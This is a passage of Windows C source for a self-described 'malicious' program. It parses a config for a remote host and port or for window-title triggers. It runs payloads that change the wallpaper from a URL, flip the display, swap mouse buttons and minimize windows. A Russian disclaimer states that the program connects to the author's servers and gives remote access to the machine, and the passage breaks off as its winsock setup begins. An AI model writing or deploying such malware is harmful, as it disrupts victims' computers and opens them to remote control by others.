

                    if (StrCmpW(token, L"remote") == 0)
                    {
						StrCpyW(MODE, token);

                        while (token != NULL)
                        {

                            token = wcstok_s(NULL, delim, &buffer);
                            if (StrCmpW(token, delim) != 0)
                            {
                                if (count == 0)
                                {
									if (token == NULL || StrCmpW(token, "\n") == 0)
									{
										StrCpyW(MODE, L"");
										errcode = -1;
										return -1;
									}

									wcscpy_s(HOST, 1024, token);
                                }
                                else if (count == 1)
                                {
									if (token == NULL || StrCmpW(token, "\n") == 0)
									{
										StrCpyW(MODE, L"");
										errcode = -1;
										return -1;
									}

									wcscpy_s(PORT, 1024, token);
                                }
                            }
                            count++;
                        }
                    }
                    else if (StrCmpW(token, L"mine") == 0)
                    {
						StrCpyW(MODE, token);

                        while (token != NULL)
                        {
                            token = wcstok_s(NULL, delim, &buffer);

							if ((token == NULL || StrCmpW(token, "\n") == 0) && count < 1)
							{
								StrCpyW(MODE, L"");
								errcode = -1;
								return -1;
							}

                            if (StrCmpW(token, delim) != 0)
                            {
                                TRIGGER[count] = token;
                            }

                            count++;
                        }
                    }
                }
            }

            fclose(file);
        }
        else
        {
            errcode = -1;
        }
    }

    return errcode;
}

BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
{
    int length = GetWindowTextLength(hWnd);

    if (IsWindowVisible(hWnd) && length != 0)
    {
        wchar_t text[256] = { 0 };

        GetWindowTextW(hWnd, text, length + 1);
        for (int i = 0; i < 256; i++)
        {
            if (TRIGGER[i] == 0)
                break;

            if (StrStrW(CharLowerW(text), CharLowerW(TRIGGER[i])))
            {
                return 0;
            }
        }
        
    }

    return 1;
}

int malicious()
{
	int errcode = 0;

	if (URL != NULL)
	{
		errcode = setWallpaperURL(URL);
	}
    else
        errcode = setWallpaperURL(defaultUrl);

    errcode = flipDisplay(1);
    errcode = SwapMouseButton(1);
    minimizeAll();

	return errcode;
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nShowCmd)
{
    if (MessageBoxW(
        0,
        L"Внимание! Эта программа может повредить этой ЭВМ! Запускать только на собственной ЭВМ! Запускать только на тестовой системе! Использовать только в образовательных, исследовательских и демонстрационных целях! Запрещается использование этой программы на ЭВМ, если у Вас нет прямой санкции на запуск этой программы от владельца ЭВМ!\n\nНажимая кнопку \"Да\" в этом окне, Вы соглашаетесь с тем, что эта программа может выполнять любые действия с этой ЭВМ, всей информацией, на ней хранящейся, и всеми устройствами, подключёнными к ней, включая, но не ограничиваясь следующими действиями:\n- изменением настроек монитора или другого дисплея;\n- загрузкой и сохранением на локальных дисках данных из сети \"Интернет\";\n- сменой фона рабочего стола;\n- изменением настроек компьютерной мыши;\n- изменением состояния открытых окон;\n- чтением и обработкой информации с локальных дисков или внешних носителей информации;\n- чтением и обработкой свойств открытых окон;\n- подключением к внешним серверам по сети \"Интернет\".\n\nНажимая кнопку \"Да\" в этом окне, вы соглашаетесь с тем, что эта программа может подключатся к удалённым серверам автора этой программы, которые расположены в Перми, а также с тем, что эта ЭВМ может получать удалённые команды от сервера, и у каждого подключившегося к этому серверу будет удалённый доступ к Вашей ЭВМ в том числе.\n\nАвтор этой программы не несёт ответственность за любой вред, причинённый данной программой этой ЭВМ, другим ЭВМ, физическим и юридическим лицам, уничтожение, копирование, модификацию, блокирование или любые другие действия, совершённые этой программой в отношении Ваших данных.\n\nНажимая кнопку \"Да\" в этом окне, Вы соглашаетесь со всеми вышеперечисленными условиями и даёте Вашу санкцию на все вышеперечисленные и, вообще, любые действия с Вашей ЭВМ, возлагаете всю ответственность за эти действия исключительно на себя, подтверждаете, что вы полностью ознакомились с этим соглашением.\n\nНажмите кнопку \"Нет\", чтобы немедленно прекратить работу программы.",
        L"Отказ от ответственности",
        MB_YESNO + MB_ICONWARNING
    ) == IDYES)
    {
        int ret = 0;

		if (loadConfig() != 0)
			ret = -1;

        if (StrCmpW(MODE, L"remote") == 0 && HOST != 0 && PORT != 0)
        {
			if (winsock_init() != 0)
        
